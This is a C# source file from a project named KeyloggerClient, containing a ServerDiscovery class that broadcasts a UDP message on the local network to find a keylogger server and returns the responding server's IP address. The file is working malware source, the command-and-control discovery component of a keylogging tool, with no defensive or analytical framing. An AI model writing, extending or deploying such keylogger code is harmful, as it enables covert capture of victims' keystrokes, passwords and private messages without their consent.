using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace KeyloggerClient
{
    public static class ServerDiscovery
    {
        /// <summary>
        /// Discovers the keylogger server on the local network by sending a UDP broadcast and waiting for a response.
        /// </summary>
        /// <param name="broadcastPort">The UDP port used for discovery (default is 6000).</param>
        /// <param name="timeout">How long to wait for a response (in milliseconds).</param>
        /// <returns>The IP address of the server if found; otherwise, null.</returns>
        public static async Task<string> DiscoverServerAsync(int broadcastPort = 6000, int timeout = 2000)
        {
            using (var udpClient = new UdpClient())
            {
                udpClient.EnableBroadcast = true;
                udpClient.Client.ReceiveTimeout = timeout;
                string resp = null;

                IPEndPoint broadcastEndpoint = new IPEndPoint(IPAddress.Broadcast, broadcastPort);
                byte[] discoveryMessage = Encoding.UTF8.GetBytes("DISCOVER_KEYLOGGER_SERVER");

                try
                {
                    await udpClient.SendAsync(discoveryMessage, discoveryMessage.Length, broadcastEndpoint);

                    var receiveTask = udpClient.ReceiveAsync();
                    if (await Task.WhenAny(receiveTask, Task.Delay(timeout)) == receiveTask)
                    {
                        var response = receiveTask.Result;
                        string responseMessage = Encoding.UTF8.GetString(response.Buffer);

                        if (responseMessage.StartsWith("KEYLOGGER_SERVER_RESPONSE:"))
                        {
                            resp = responseMessage.Substring("KEYLOGGER_SERVER_RESPONSE:".Length);
                            return resp;
                        }
                    }
                }
                catch
                {
                    // Ignore exceptions (timeouts or network errors)
                    return resp;
                }

                return resp;
            }
        }
    }
}
